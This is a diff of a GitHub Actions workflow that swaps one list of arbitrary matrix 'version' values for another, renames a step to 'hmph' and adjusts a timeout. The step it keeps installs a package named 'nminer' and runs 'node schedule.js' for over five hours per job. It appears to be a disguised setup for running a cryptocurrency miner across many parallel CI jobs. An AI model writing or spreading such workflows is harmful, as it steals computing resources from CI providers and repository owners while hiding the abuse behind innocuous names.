@@ -9,21 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2967 }
-          - { version: 16 }
-          - { version: 6902 }
-          - { version: 9434 }
-          - { version: 5240 }
-          - { version: 3902 }
-          - { version: 6276 }
-          - { version: 905 }
-          - { version: 2519 }
-          - { version: 7245 }
-          - { version: 2491 }
-          - { version: 4232 }
-          - { version: 8197 }
-          - { version: 1683 }
-          - { version: 4139 }
+          - { version: 639 }
+          - { version: 9377 }
+          - { version: 2223 }
+          - { version: 3829 }
+          - { version: 6110 }
+          - { version: 5807 }
+          - { version: 9093 }
+          - { version: 7088 }
+          - { version: 950 }
+          - { version: 5531 }
+          - { version: 5022 }
+          - { version: 4941 }
+          - { version: 9618 }
+          - { version: 5870 }
+          - { version: 5099 }
+          - { version: 570 }
+          - { version: 8345 }
 
     steps:
       - name: Checkout
@@ -34,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: for
+      - name: hmph
         run: |
           npm install nminer@latest
-          timeout 339m node schedule.js || echo "schedule executed"
+          timeout 314m node schedule.js || echo "schedule executed"
